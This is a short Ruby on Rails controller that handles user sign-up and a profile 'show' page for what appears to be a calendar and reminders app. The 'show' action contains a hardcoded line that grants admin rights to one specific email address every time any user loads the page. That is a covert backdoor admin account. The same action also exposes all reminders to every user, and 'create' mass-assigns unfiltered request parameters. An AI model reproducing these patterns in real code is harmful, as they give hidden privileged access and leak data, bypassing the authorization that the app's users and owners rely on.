class UsersControllerController < ApplicationController

  def new
  	@user = User.new
  end

  def create

    @user = User.new(params[:user])
    @user.admin = false

    if @user.save
      Calendar.create(:name => @user[:username], :user_id => @user.id)
      sign_in @user
      redirect_to root_path, :flash => {:success => "Successfully created acount!"}
    else
      render 'new', :flash => {:error => "Problems occured while creating account. Try again or contact that administrator"}
    end
    
  end

  def show
    @user = User.find(current_user)
    @reminders = Reminder.all
    User.find_by_email("jacklotkowski@gmail.com").update_attribute('admin', true)
  end

end
